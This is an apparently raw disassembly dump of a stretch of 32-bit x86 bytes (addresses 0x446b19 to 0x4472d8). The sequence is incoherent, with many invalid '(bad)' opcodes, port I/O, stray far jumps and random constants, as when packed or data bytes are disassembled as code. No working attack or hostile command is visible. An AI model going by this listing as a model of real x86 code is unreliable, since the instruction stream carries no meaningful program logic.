  446b19:	scas   eax,DWORD PTR es:[edi]
  446b1a:	addr16 hlt 
  446b1c:	push   0x1f15f601
  446b21:	or     DWORD PTR [edi-0x8],ecx
  446b24:	add    ebx,DWORD PTR [eax]
  446b26:	inc    esi
  446b27:	cld    
  446b28:	or     eax,0x94348ba8
  446b2d:	push   es
  446b2e:	inc    ebp
  446b2f:	sub    eax,0xcbb3ca60
  446b34:	xchg   esi,eax
  446b35:	gs mov edi,0x67e85b24
  446b3b:	(bad)  
  446b3d:	cmp    DWORD PTR [edx+0x5e07b3ec],0xfffffff5
  446b44:	div    DWORD PTR gs:[ebp*2-0x4b3cd4fc]
  446b4c:	cs mov edi,0x9d3be56c
  446b52:	mov    ebx,0xedf8469a
  446b57:	push   0x6b
  446b59:	pop    edx
  446b5a:	leave  
  446b5b:	sbb    BYTE PTR [edi],dh
  446b5d:	mov    BYTE PTR [ebx-0x44bd7a18],ch
  446b63:	je     0x446ba6
  446b65:	loop   0x446b92
  446b67:	inc    ecx
  446b68:	and    eax,0x1ae851e4
  446b6d:	pop    edi
  446b6e:	adc    BYTE PTR [ebp+0x49],bl
  446b71:	test   eax,0xba07f6b1
  446b76:	data16 adc di,WORD PTR [esp+edx*1+0x3d34e5e7]
  446b7f:	repz push edx
  446b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446b82:	cs dec ebp
  446b84:	sbb    BYTE PTR [ecx],bh
  446b86:	call   0xd7e1:0x4aaed1b6
  446b8d:	stos   BYTE PTR es:[edi],al
  446b8e:	bound  eax,QWORD PTR [edx-0x5c]
  446b91:	call   0x8a93:0x1d7ba85b
  446b98:	jp     0x446b96
  446b9a:	stos   BYTE PTR es:[edi],al
  446b9b:	outs   dx,DWORD PTR ds:[esi]
  446b9c:	sub    eax,0xb3b7bd61
  446ba1:	cdq    
  446ba2:	dec    ebx
  446ba3:	adc    DWORD PTR [edi],esi
  446ba5:	adc    edx,DWORD PTR [esi]
  446ba7:	inc    eax
  446ba8:	mov    DWORD PTR [ebx],edi
  446baa:	in     eax,dx
  446bab:	cdq    
  446bac:	(bad)  
  446bad:	lahf   
  446bae:	mov    ah,0x54
  446bb0:	push   ds
  446bb1:	inc    BYTE PTR [edx+0x306a1503]
  446bb7:	jmp    0x591d:0xb92d5068
  446bbe:	mov    edi,0xfe2d0ec6
  446bc3:	push   esp
  446bc4:	nop
  446bc5:	push   esp
  446bc6:	(bad)  
  446bc7:	sti    
  446bc8:	and    BYTE PTR [ecx+0xa],ah
  446bcb:	or     bh,BYTE PTR [ebx+0x189e108e]
  446bd1:	stc    
  446bd2:	in     eax,0x26
  446bd4:	add    ah,BYTE PTR [ebx]
  446bd6:	adc    dh,BYTE PTR [ebp-0x1d]
  446bd9:	mov    ds:0x207f423e,al
  446bde:	inc    ebx
  446bdf:	call   0x9e7078d2
  446be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446be5:	dec    BYTE PTR [edx]
  446be7:	mov    eax,0x10b498d2
  446bec:	jecxz  0x446b8d
  446bee:	sub    ebx,DWORD PTR [ebp+0x77]
  446bf1:	mov    esi,0x40e2bf6a
  446bf6:	xchg   edx,eax
  446bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446bf9:	bound  edi,QWORD PTR [esi+0x48389754]
  446bff:	nop    ebx
  446c02:	gs test ah,bh
  446c05:	fwait
  446c06:	mov    esi,0x78f7de04
  446c0b:	xor    ebx,eax
  446c0d:	mov    ah,0xb7
  446c0f:	je     0x446c6e
  446c11:	out    0x5a,al
  446c13:	mov    edi,0xf3a3d845
  446c18:	push   edi
  446c19:	scas   eax,DWORD PTR es:[edi]
  446c1a:	mov    bl,0x90
  446c1c:	jmp    0x1cbc244b
  446c21:	and    eax,0x98c84ad
  446c26:	jmp    0x9d495146
  446c2b:	out    0x8e,al
  446c2d:	add    edx,edi
  446c2f:	std    
  446c30:	and    ebp,DWORD PTR [ecx+0x475da9d5]
  446c36:	arpl   si,bp
  446c38:	in     eax,dx
  446c39:	mov    DWORD PTR [edi-0x19a6e695],ecx
  446c3f:	and    BYTE PTR [edi+0x194ea2ca],ah
  446c45:	pop    ecx
  446c46:	mov    al,0x3e
  446c48:	pushf  
  446c49:	push   esi
  446c4a:	popf   
  446c4b:	pop    edx
  446c4c:	pop    edi
  446c4d:	lahf   
  446c4e:	aam    0xb3
  446c50:	aad    0x33
  446c52:	mov    edx,esi
  446c54:	add    al,0x29
  446c56:	les    ebp,FWORD PTR [eax+0x242fb91c]
  446c5c:	cld    
  446c5d:	jbe    0x446c24
  446c5f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446c61:	mov    dh,0xb
  446c63:	xchg   ecx,eax
  446c64:	call   0x1da3:0xcfed4e77
  446c6b:	fcom   QWORD PTR [esi]
  446c6d:	cdq    
  446c6e:	leave  
  446c6f:	adc    eax,0xd6d22813
  446c74:	js     0x446c85
  446c76:	sub    al,0xed
  446c78:	jnp    0x446ccf
  446c7a:	xor    BYTE PTR [ecx-0x16],0x4a
  446c7e:	fsub   st,st(4)
  446c80:	pop    ss
  446c81:	sub    esi,esp
  446c83:	pop    esi
  446c84:	add    DWORD PTR [ebx+0x51],ebp
  446c87:	(bad)  
  446c88:	mov    esp,0x1f08cbae
  446c8d:	scas   al,BYTE PTR es:[edi]
  446c8e:	int    0x39
  446c90:	jno    0x446c76
  446c92:	sub    dl,BYTE PTR [ecx+ebx*1+0x2e0fd0c9]
  446c99:	out    0xa0,al
  446c9b:	ss in  al,dx
  446c9d:	fwait
  446c9e:	dec    ebx
  446c9f:	adc    ecx,DWORD PTR [ecx+edx*1+0x1e999de2]
  446ca6:	addr16 pusha 
  446ca8:	dec    ebp
  446ca9:	jne    0x446c6a
  446cab:	les    ebp,FWORD PTR [ebx-0x76]
  446cae:	cdq    
  446caf:	(bad)  
  446cb0:	(bad)  
  446cb1:	(bad)  [ecx]
  446cb3:	and    bh,bl
  446cb5:	jmp    0x446c76
  446cb7:	test   eax,0x3d49662f
  446cbc:	cs test eax,0xb604c9fd
  446cc2:	push   0xffffffbe
  446cc4:	push   ss
  446cc5:	pop    es
  446cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446cc7:	cmc    
  446cc8:	out    dx,al
  446cc9:	mov    ds:0x252ee4db,al
  446cce:	inc    edx
  446ccf:	push   ss
  446cd0:	pop    esp
  446cd1:	and    DWORD PTR [ebx],eax
  446cd3:	(bad)
  446cd6:	xor    eax,0xd7892550
  446cdb:	push   ds
  446cdc:	into   
  446cdd:	push   ecx
  446cde:	ror    BYTE PTR [ebp+0x75],cl
  446ce1:	and    ecx,DWORD PTR [ecx]
  446ce3:	repz mov eax,0x1c960e37
  446ce9:	or     DWORD PTR ds:0xaa9cfaad,ecx
  446cef:	imul   ebx,DWORD PTR [esi+0x11bd2b9b],0xffffffc4
  446cf6:	leave  
  446cf7:	or     eax,ebx
  446cf9:	inc    ebx
  446cfa:	stc    
  446cfb:	in     al,0x5a
  446cfd:	mov    BYTE PTR [ecx-0x41c3280a],cl
  446d03:	in     al,dx
  446d04:	fsubr  QWORD PTR [edi-0x12]
  446d07:	icebp  
  446d08:	lahf   
  446d09:	sub    BYTE PTR [ebx-0x4c3b67e3],cl
  446d0f:	adc    al,0x16
  446d11:	lods   al,BYTE PTR ds:[esi]
  446d12:	add    edx,DWORD PTR [edx*2-0x381b15ed]
  446d19:	fisubr DWORD PTR [ebp+0x7f4922e8]
  446d1f:	fchs   
  446d21:	jae    0x446d40
  446d23:	cld    
  446d24:	dec    esi
  446d25:	daa    
  446d26:	adc    esi,esi
  446d28:	js     0x446caf
  446d2a:	push   edx
  446d2b:	std    
  446d2c:	sbb    BYTE PTR [esi-0x367859c6],ah
  446d32:	lahf   
  446d33:	pop    es
  446d34:	inc    edi
  446d35:	out    0x6e,al
  446d37:	fcomp  QWORD PTR [ecx]
  446d39:	lds    edi,FWORD PTR [esi-0x6a2a0a4c]
  446d3f:	call   0x99b50b19
  446d44:	sahf   
  446d45:	xor    al,0xb
  446d47:	add    ebx,DWORD PTR [ebx+esi*4-0x43]
  446d4b:	mov    ah,0x9d
  446d4d:	cmp    DWORD PTR [edx],eax
  446d4f:	loopne 0x446d76
  446d51:	enter  0xe8cd,0xbf
  446d55:	pop    ebx
  446d56:	push   edi
  446d57:	push   0xe7ff7f18
  446d5c:	lea    ecx,[ebx-0x608a5e4e]
  446d62:	stos   DWORD PTR es:[edi],eax
  446d63:	shl    esp,1
  446d65:	dec    ecx
  446d66:	not    DWORD PTR [esp+eax*8-0x35707188]
  446d6d:	adc    esi,DWORD PTR [edi+0x7c7d4ed4]
  446d73:	rol    esi,1
  446d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446d76:	rcl    DWORD PTR ds:0xdf187e66,1
  446d7c:	pop    esp
  446d7d:	sub    al,cl
  446d7f:	add    eax,DWORD PTR [ebx+0x2345b9fb]
  446d85:	imul   ebp,edx,0x6b53c6ea
  446d8b:	ins    BYTE PTR es:[edi],dx
  446d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446d8d:	mov    ds:0x6aa3f45a,eax
  446d92:	and    ecx,0xebc1a950
  446d98:	push   ds
  446d99:	mov    esi,0xfd7f3d4d
  446d9e:	sahf   
  446d9f:	imul   esp,DWORD PTR [ebp-0x7],0xf236ed2d
  446da6:	addr16 punpckhwd mm3,mm1
  446daa:	cmp    al,0xcd
  446dac:	enter  0xdb1d,0x1c
  446db0:	aaa    
  446db1:	out    dx,al
  446db2:	mov    esi,0xe5ee8580
  446db7:	in     al,dx
  446db8:	cmp    al,0x65
  446dba:	xchg   edx,eax
  446dbb:	xchg   edi,eax
  446dbc:	push   ss
  446dbd:	cmp    ebx,edi
  446dbf:	imul   BYTE PTR [esi+0x23ed201f]
  446dc5:	imul   ebx,edi,0xffffffd2
  446dc8:	in     al,dx
  446dc9:	push   edx
  446dca:	out    0x5f,al
  446dcc:	ror    DWORD PTR [edx-0x61ca0312],1
  446dd2:	dec    edx
  446dd3:	call   0xd93:0x3f9c98b7
  446dda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446ddb:	inc    ebp
  446ddc:	pop    ss
  446ddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446dde:	sbb    ch,bh
  446de0:	(bad)  
  446de1:	mov    ch,BYTE PTR [ebp-0x66]
  446de4:	xor    al,0x6c
  446de6:	xchg   ebp,eax
  446de7:	inc    edx
  446de8:	pop    ebp
  446de9:	stc    
  446dea:	pop    es
  446deb:	out    dx,al
  446dec:	outs   dx,BYTE PTR ds:[esi]
  446ded:	in     al,0xee
  446def:	xchg   esi,eax
  446df0:	ja     0x446e40
  446df2:	mov    edi,0xb4a90174
  446df7:	test   al,0x16
  446df9:	jecxz  0x446de1
  446dfb:	add    edi,eax
  446dfd:	cmp    DWORD PTR [esi+0x56],0xffffffcc
  446e01:	xchg   edx,eax
  446e02:	mov    esp,esi
  446e04:	out    dx,eax
  446e05:	aad    0xba
  446e07:	adc    al,0x33
  446e09:	jg     0x446dca
  446e0b:	or     al,0xc4
  446e0d:	mov    al,ds:0xcd972f2b
  446e12:	push   esi
  446e13:	jecxz  0x446e10
  446e15:	das    
  446e16:	mov    eax,ds:0xb3204ba4
  446e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446e1c:	stos   BYTE PTR es:[edi],al
  446e1d:	jl     0x446e35
  446e1f:	mov    ebp,esp
  446e21:	lea    esi,[edx]
  446e23:	jmp    0xb930:0xfcb8dafa
  446e2a:	adc    BYTE PTR [ecx+0x3bc17e23],dh
  446e30:	in     al,0xe7
  446e32:	in     al,0x1b
  446e34:	aad    0x0
  446e36:	fdivr  st(2),st
  446e38:	fcom   QWORD PTR [edx+edi*8-0x68b6ddae]
  446e3f:	dec    ecx
  446e40:	push   DWORD PTR [edx-0x6c]
  446e43:	arpl   WORD PTR [esi],dx
  446e45:	mov    ds:0xed11143b,eax
  446e4a:	js     0x446e8e
  446e4c:	sahf   
  446e4d:	(bad)  
  446e4e:	pop    ebp
  446e4f:	retf   
  446e50:	test   BYTE PTR [ebx],al
  446e52:	mov    al,0x84
  446e54:	or     BYTE PTR [edi+0x76],dh
  446e57:	add    BYTE PTR [edx-0x3e],ch
  446e5a:	dec    ecx
  446e5b:	out    dx,al
  446e5c:	jne    0x446e55
  446e5e:	(bad)  
  446e60:	sti    
  446e61:	fadd   st(3),st
  446e63:	repnz sbb edx,edx
  446e66:	jle    0x446e75
  446e68:	popa   
  446e69:	push   edx
  446e6a:	sub    al,0x65
  446e6c:	push   ss
  446e6d:	loopne 0x446e75
  446e6f:	adc    al,0x9f
  446e72:	imul   edx,DWORD PTR [eax-0x7437b5ed],0x57
  446e79:	add    DWORD PTR [eax+0x56],0x2d
  446e7d:	cs xchg esp,eax
  446e7f:	lds    ebx,FWORD PTR ds:0x64e0b7d9
  446e85:	scas   al,BYTE PTR es:[edi]
  446e86:	and    al,0x60
  446e88:	xchg   ebp,eax
  446e89:	shl    eax,0xe8
  446e8c:	popf   
  446e8d:	(bad)  
  446e8e:	pop    edx
  446e8f:	sbb    ebx,DWORD PTR [ebx]
  446e91:	mov    DWORD PTR [edi-0x59],ecx
  446e94:	pusha  
  446e95:	shl    BYTE PTR [edi],cl
  446e97:	xor    edx,edx
  446e99:	or     ecx,DWORD PTR [ebp-0x71]
  446e9c:	sub    bl,BYTE PTR [edx+0x4c6fb54b]
  446ea2:	sar    BYTE PTR [ebp-0x4ce06e1],0x71
  446ea9:	or     BYTE PTR [eax+0x2b9a91c3],ch
  446eaf:	dec    edx
  446eb0:	stc    
  446eb1:	in     eax,0x5e
  446eb3:	jo     0x446e97
  446eb5:	sahf   
  446eb6:	inc    ecx
  446eb7:	pushf  
  446eb8:	jns    0x446e4d
  446eba:	mov    al,0xa4
  446ebc:	loop   0x446f03
  446ebe:	pop    ecx
  446ebf:	push   ebp
  446ec0:	test   ecx,esi
  446ec2:	loopne 0x446eb6
  446ec4:	outs   dx,BYTE PTR ds:[esi]
  446ec5:	sbb    esp,DWORD PTR [ebx-0x5656e7e5]
  446ecb:	mov    esp,0x821d9cc8
  446ed0:	inc    edi
  446ed1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446ed2:	dec    ebx
  446ed3:	popa   
  446ed4:	mov    eax,ss
  446ed6:	ror    DWORD PTR [edi],0xc0
  446ed9:	xchg   esp,eax
  446eda:	mov    ebp,0x23dbf359
  446edf:	je     0x446e86
  446ee1:	lds    esi,FWORD PTR [eax+0x78774b54]
  446ee7:	sbb    BYTE PTR [edi],dh
  446ee9:	push   edi
  446eea:	pop    edi
  446eeb:	mov    ah,0x5b
  446eed:	(bad)  
  446eef:	das    
  446ef0:	dec    esi
  446ef1:	lock mov edx,0xdfe4e714
  446ef7:	inc    edi
  446ef8:	inc    esi
  446ef9:	in     eax,0x98
  446efb:	in     eax,0xe1
  446efd:	xor    DWORD PTR [ecx+0x6ba81df2],0xffffffe1
  446f04:	cmp    esp,DWORD PTR [edx+eiz*4-0x92305a5]
  446f0b:	sbb    eax,ebx
  446f0d:	ret    
  446f0e:	mov    edi,0x79be3834
  446f13:	jne    0x446eee
  446f15:	or     al,BYTE PTR [ebp+0x24d4e3be]
  446f1b:	ins    DWORD PTR es:[edi],dx
  446f1c:	xchg   DWORD PTR [ebx-0x26e01abf],ebx
  446f22:	out    dx,al
  446f23:	repnz inc esp
  446f25:	mov    ebx,0x3f4630e2
  446f2a:	pop    edx
  446f2b:	push   0xe51da325
  446f30:	dec    eax
  446f31:	mov    BYTE PTR [ecx+0x75291884],ah
  446f37:	enter  0x281f,0x3f
  446f3b:	in     eax,dx
  446f3c:	xlat   BYTE PTR ds:[ebx]
  446f3d:	leave  
  446f3e:	or     ebx,DWORD PTR [edi+0x78]
  446f41:	inc    esi
  446f42:	push   ebx
  446f43:	je     0x446eea
  446f45:	ss js  0x446f26
  446f48:	sbb    bl,cl
  446f4a:	fistp  DWORD PTR [ecx+0xa735707]
  446f50:	jg     0x446eff
  446f52:	cmp    ebx,DWORD PTR [eax]
  446f54:	jl     0x446f71
  446f56:	add    ebp,DWORD PTR [eax+ebx*1+0x1601fa26]
  446f5d:	mov    ecx,0xa20b2578
  446f62:	mov    ch,0xe9
  446f64:	pop    edi
  446f65:	and    BYTE PTR [ebx],0xd7
  446f68:	inc    ebp
  446f69:	loope  0x446fc8
  446f6b:	in     al,dx
  446f6c:	outs   dx,BYTE PTR ds:[esi]
  446f6d:	enter  0xc1a5,0x3b
  446f71:	cwde   
  446f72:	push   ebx
  446f73:	xchg   esp,eax
  446f74:	leave  
  446f75:	les    esp,FWORD PTR [edx*2-0x4c5a51e3]
  446f7c:	mul    BYTE PTR [esi+eiz*2-0x6c78f91b]
  446f83:	test   BYTE PTR [edi],bl
  446f85:	and    DWORD PTR [eax-0x5fa358a5],eax
  446f8b:	aad    0xf1
  446f8d:	ins    BYTE PTR es:[edi],dx
  446f8e:	mov    esi,0xd2e98d13
  446f93:	jmp    0x3f2b:0x357cd496
  446f9a:	jp     0x447003
  446f9c:	test   DWORD PTR [ecx+esi*4],esp
  446f9f:	aam    0x58
  446fa1:	dec    edi
  446fa2:	inc    ebp
  446fa3:	cmp    edi,DWORD PTR [ebx+0x52]
  446fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446fa7:	aad    0x48
  446fa9:	xchg   BYTE PTR [esi-0x4038a474],al
  446faf:	push   esp
  446fb0:	mov    ah,0xa6
  446fb2:	jnp    0x446fa8
  446fb4:	(bad)  
  446fb5:	mov    ebp,0x7ccd7171
  446fba:	outs   dx,DWORD PTR ds:[esi]
  446fbb:	in     al,dx
  446fbc:	(bad)  
  446fbe:	mov    edi,0x81e5a154
  446fc3:	out    0xa6,eax
  446fc5:	inc    eax
  446fc6:	dec    esi
  446fc7:	fild   QWORD PTR [ebx]
  446fc9:	jnp    0x446fe4
  446fcb:	or     dh,bl
  446fcd:	pop    ecx
  446fce:	jns    0x446ff7
  446fd0:	push   ds
  446fd1:	mov    ebx,esi
  446fd3:	iret   
  446fd4:	xor    edx,esi
  446fd6:	scas   eax,DWORD PTR es:[edi]
  446fd7:	aam    0x2a
  446fd9:	les    edi,FWORD PTR [ebx]
  446fdb:	mov    ds:0x6460b2b7,al
  446fe0:	and    al,0x15
  446fe2:	popa   
  446fe3:	push   es
  446fe4:	dec    eax
  446fe5:	cmp    edx,edx
  446fe7:	and    al,0xd8
  446fe9:	mov    bh,0x51
  446feb:	repnz sar BYTE PTR [ebp+0x6a],cl
  446fef:	jb     0x447037
  446ff1:	push   ebx
  446ff2:	and    esp,esp
  446ff4:	sbb    DWORD PTR [edi+0x16175102],esp
  446ffa:	add    al,BYTE PTR [esi+ebx*8+0x6c]
  446ffe:	in     al,0x7b
  447000:	pop    ebp
  447001:	inc    esi
  447002:	mov    bh,0xee
  447004:	jae    0x44703d
  447006:	ins    BYTE PTR es:[edi],dx
  447007:	inc    ecx
  447008:	(bad)  
  447009:	scas   al,BYTE PTR es:[edi]
  44700a:	mov    WORD PTR [esi],ss
  44700c:	ss mov esi,0xf839b357
  447012:	cmp    edx,DWORD PTR [ecx+ecx*2+0x6954b461]
  447019:	out    0x60,eax
  44701b:	xchg   esi,eax
  44701c:	adc    eax,0xa60d4b69
  447021:	push   edx
  447022:	mov    cs:0xe8ff412d,eax
  447028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447029:	pusha  
  44702a:	cmp    ecx,DWORD PTR [eax+0x2367d919]
  447030:	or     esp,DWORD PTR [ebx+0x28]
  447033:	shl    DWORD PTR [ebx+0x55],0xfc
  447037:	adc    al,0x85
  447039:	(bad)  
  44703a:	scas   eax,DWORD PTR es:[edi]
  44703b:	xchg   esp,eax
  44703c:	push   cs
  44703d:	in     eax,0xbe
  44703f:	xchg   esp,eax
  447040:	das    
  447041:	imul   edi,eax,0x1e5542b9
  447047:	dec    ecx
  447048:	push   ebp
  447049:	sub    BYTE PTR [esi],ah
  44704b:	into   
  44704c:	mov    dl,0xa1
  44704e:	jmp    0x446ffe
  447050:	fild   WORD PTR [edx+0x73a63cda]
  447056:	(bad)  
  447057:	pusha  
  447058:	sub    eax,0x4c7344b8
  44705e:	addr16 mov eax,ds:0xddb5
  447062:	cli    
  447063:	call   0x9c05e7fc
  447068:	pop    ds
  447069:	cmp    DWORD PTR [ecx+0x10b532f9],esi
  44706f:	cmp    eax,0x8dcc7d79
  447074:	inc    esp
  447075:	dec    ebx
  447076:	jp     0x447052
  447078:	loopne 0x447044
  44707a:	mov    ah,0xee
  44707c:	mov    WORD PTR [ecx-0x36150157],?
  447082:	mov    ecx,esi
  447084:	xor    DWORD PTR [esi],0xd3f60cd
  44708a:	mov    esp,0xadb6dad0
  44708f:	js     0x44709b
  447091:	and    dl,BYTE PTR [esi]
  447093:	dec    edx
  447094:	rcl    al,cl
  447096:	test   DWORD PTR [ebp-0x7],0x5e0771d
  44709d:	(bad)  
  44709e:	lahf   
  44709f:	out    0x12,al
  4470a1:	and    cl,ch
  4470a3:	cmc    
  4470a4:	cmc    
  4470a5:	add    BYTE PTR [esi-0xd],cl
  4470a8:	push   edi
  4470a9:	rol    BYTE PTR [edi],1
  4470ab:	loope  0x447041
  4470ad:	sub    DWORD PTR [esp+eiz*4-0x54661e78],eax
  4470b4:	sub    ch,BYTE PTR [ebx]
  4470b6:	mov    esp,0xea7db94d
  4470bb:	jns    0x447062
  4470bd:	inc    eax
  4470be:	sub    edi,DWORD PTR [esi]
  4470c0:	inc    esi
  4470c1:	xchg   edx,eax
  4470c2:	mov    ebx,0x8b9a6914
  4470c7:	je     0x4470d3
  4470c9:	cmp    eax,0xc9d67d82
  4470ce:	imul   DWORD PTR [esp+eax*4]
  4470d1:	dec    ebp
  4470d2:	test   eax,0xd43de075
  4470d7:	adc    eax,0x3ba45122
  4470dc:	loopne 0x447086
  4470de:	pop    ebx
  4470df:	mov    edi,0xf1582478
  4470e4:	fbld   TBYTE PTR [ebx-0xe2870e6]
  4470ea:	mov    ebx,0x2a10c7b4
  4470ef:	fsub   QWORD PTR [ebp-0x41]
  4470f2:	fwait
  4470f3:	jmp    0xa994588e
  4470f8:	cmc    
  4470f9:	cdq    
  4470fa:	stc    
  4470fb:	(bad)  [ebx+0x1d]
  4470fe:	lds    ecx,FWORD PTR [esi]
  447100:	add    BYTE PTR [ebp+edi*4+0x27],ah
  447104:	(bad)  
  447105:	mov    eax,ds:0xe500b0c3
  44710a:	sub    DWORD PTR [edx+0x18],edx
  44710d:	mov    DWORD PTR [esi+edi*2],ebp
  447110:	xor    BYTE PTR [edi],dh
  447112:	leave  
  447113:	stos   DWORD PTR es:[edi],eax
  447114:	mov    DWORD PTR ds:0x4d14f82c,esi
  44711a:	push   es
  44711b:	cld    
  44711c:	fstp   QWORD PTR [esi]
  44711e:	lods   al,BYTE PTR ds:[esi]
  44711f:	repnz test eax,0x6d3abbd4
  447125:	jne    0x447101
  447127:	scas   al,BYTE PTR es:[edi]
  447128:	and    DWORD PTR [ecx-0x6f],esi
  44712b:	and    al,0x21
  44712d:	pop    ecx
  44712e:	jo     0x4470e4
  447130:	or     eax,0x601018ff
  447135:	lahf   
  447136:	rol    BYTE PTR [esi-0x7e],0xca
  44713a:	fstp   TBYTE PTR [ecx-0x14e9da58]
  447140:	mov    ds:0x1c3ae261,eax
  447145:	or     DWORD PTR [ebp+0x4b1d6968],ebx
  44714b:	cmp    bl,bh
  44714d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44714e:	cmp    eax,DWORD PTR [eax-0x6c]
  447151:	add    bl,0xd4
  447154:	xchg   esi,eax
  447155:	rcr    esi,0xb3
  447158:	inc    ebp
  447159:	repz in eax,dx
  44715b:	test   BYTE PTR [edi],al
  44715d:	sar    DWORD PTR [eax+0x69],cl
  447160:	iret   
  447161:	nop
  447162:	pop    ds
  447163:	lock lds eax,FWORD PTR [esi+0x3801e831]
  44716a:	pop    edx
  44716b:	es or  al,0x9a
  44716e:	je     0x4471d3
  447170:	dec    ebp
  447171:	into   
  447172:	stos   DWORD PTR es:[edi],eax
  447173:	gs and eax,0x9b31561e
  447179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44717a:	jnp    0x447183
  44717c:	out    0xb8,al
  44717e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44717f:	xchg   esp,eax
  447180:	jp     0x4471fd
  447182:	ins    DWORD PTR es:[edi],dx
  447183:	dec    ebx
  447184:	fs je  0x44713c
  447187:	xchg   esp,eax
  447188:	lahf   
  447189:	lock lds esp,FWORD PTR [ebx+0x7d]
  44718d:	call   0xcaa3:0xea187d5b
  447194:	xchg   ecx,eax
  447195:	jg     0x44715d
  447197:	fist   WORD PTR [esi+0x6b]
  44719a:	jmp    0xaa169943
  44719f:	outs   dx,DWORD PTR ds:[esi]
  4471a0:	xchg   ecx,eax
  4471a1:	mov    al,ds:0x5f99a0d9
  4471a6:	ds in  eax,dx
  4471a8:	aaa    
  4471a9:	mov    esp,0x7dc1204b
  4471ae:	jle    0x4471eb
  4471b0:	sub    bl,BYTE PTR [esi+0x29a7c8c8]
  4471b6:	out    0x3c,al
  4471b8:	fcomp  QWORD PTR [ecx-0x57846ab5]
  4471be:	scas   al,BYTE PTR es:[edi]
  4471bf:	mov    dh,BYTE PTR [edi]
  4471c1:	ror    DWORD PTR [ebp+0x101cdac2],0x63
  4471c8:	add    eax,0xc2f8bdb7
  4471cd:	cld    
  4471ce:	sub    BYTE PTR [ecx+0x74b2021d],ch
  4471d4:	xor    eax,0x75f882a1
  4471d9:	mov    ebp,0x497ef8d
  4471de:	frstor cs:[edx]
  4471e1:	jns    0x447200
  4471e3:	pop    eax
  4471e4:	lahf   
  4471e5:	pop    ebp
  4471e6:	pop    edx
  4471e7:	aad    0xa1
  4471e9:	xor    eax,0x34f73883
  4471ee:	xchg   edx,eax
  4471ef:	rol    DWORD PTR [esi],cl
  4471f1:	rcr    BYTE PTR [ecx+0x59e5f702],1
  4471f7:	adc    al,BYTE PTR [edi-0x47]
  4471fa:	es jo  0x44721b
  4471fd:	xchg   edx,eax
  4471fe:	sbb    ecx,DWORD PTR [eax+0x6a1a8ddf]
  447204:	out    0x43,al
  447206:	inc    esi
  447208:	sbb    al,0x4f
  44720a:	into   
  44720b:	test   DWORD PTR [edx],ecx
  44720d:	sti    
  44720e:	movzx  eax,WORD PTR [ebx-0x330ad9a0]
  447215:	lods   al,BYTE PTR ds:[esi]
  447216:	sbb    eax,DWORD PTR [esi+edi*2]
  447219:	mov    ebx,gs
  44721b:	ret    0xa1d1
  44721e:	cmp    esp,DWORD PTR [ebx+edx*2+0x26]
  447222:	push   0x7e
  447224:	xchg   ecx,eax
  447225:	in     eax,dx
  447226:	mov    cs:0x25448fdb,al
  44722c:	test   DWORD PTR [ecx-0x593c0127],eax
  447232:	rcl    DWORD PTR [ebx],0x98
  447235:	jecxz  0x447241
  447237:	xchg   edi,eax
  447238:	mov    al,0xa0
  44723a:	or     esi,eax
  44723c:	dec    edi
  44723d:	mov    ds,WORD PTR [edx+0x30db0e05]
  447243:	nop
  447244:	and    esp,DWORD PTR [ecx]
  447246:	mov    cl,0xd4
  447248:	ins    DWORD PTR es:[edi],dx
  447249:	loopne 0x44723a
  44724b:	xor    BYTE PTR [esi],dl
  44724d:	pop    edi
  44724e:	xor    BYTE PTR cs:[edi],al
  447251:	(bad)  
  447252:	rcl    DWORD PTR [esp+ebx*1],cl
  447255:	outs   dx,DWORD PTR ds:[esi]
  447256:	cs call 0x7459bb74
  44725c:	cmc    
  44725d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44725e:	adc    ecx,edi
  447260:	mov    ds:0x95786ba4,eax
  447265:	(bad)  
  447266:	mov    cl,0xdf
  447268:	pop    esp
  447269:	dec    edi
  44726a:	sbb    esi,DWORD PTR [ecx-0x2b]
  44726d:	mov    ecx,esp
  44726f:	adc    DWORD PTR fs:[ebp-0x1d],ebp
  447273:	mov    dh,BYTE PTR [ecx+0x2718be94]
  447279:	or     DWORD PTR [ebp+0x49c99548],edx
  44727f:	in     eax,0xa0
  447281:	aaa    
  447282:	mov    gs,WORD PTR [eax+0x72]
  447285:	jp     0x44726a
  447287:	adc    al,0xf2
  447289:	mov    al,ds:0xa055d8a5
  44728e:	cmp    ebp,DWORD PTR [edx-0x75]
  447291:	(bad)  
  447292:	mov    ch,0xe5
  447294:	clc    
  447295:	in     eax,0x6c
  447297:	js     0x447248
  447299:	cmp    DWORD PTR [edx-0x33f1794c],0x986b052b
  4472a3:	in     al,dx
  4472a4:	mov    cl,0x46
  4472a6:	mov    eax,ds:0x40394cd7
  4472ab:	je     0x4472d5
  4472ad:	leave  
  4472ae:	add    cl,BYTE PTR [eax+0x53]
  4472b1:	jecxz  0x4472af
  4472b3:	push   0xffffffa5
  4472b5:	cmp    eax,0x653cedb9
  4472ba:	mov    WORD PTR [edi],?
  4472bc:	adc    ebp,ebp
  4472be:	mov    WORD PTR [ebp-0x62],?
  4472c1:	out    0xa9,al
  4472c3:	and    edi,DWORD PTR [esp]
  4472c6:	fwait
  4472c7:	sti    
  4472c8:	jb     0x44726d
  4472ca:	dec    ebx
  4472cb:	loopne 0x447327
  4472cd:	sahf   
  4472ce:	xchg   al,dl
  4472d0:	push   ebp
  4472d1:	scas   al,BYTE PTR es:[edi]
  4472d2:	test   eax,0xbc4e8d8a
  4472d7:	push   esp
  4472d8:	fsub   QWORD PTR [ecx-0x64774b57]
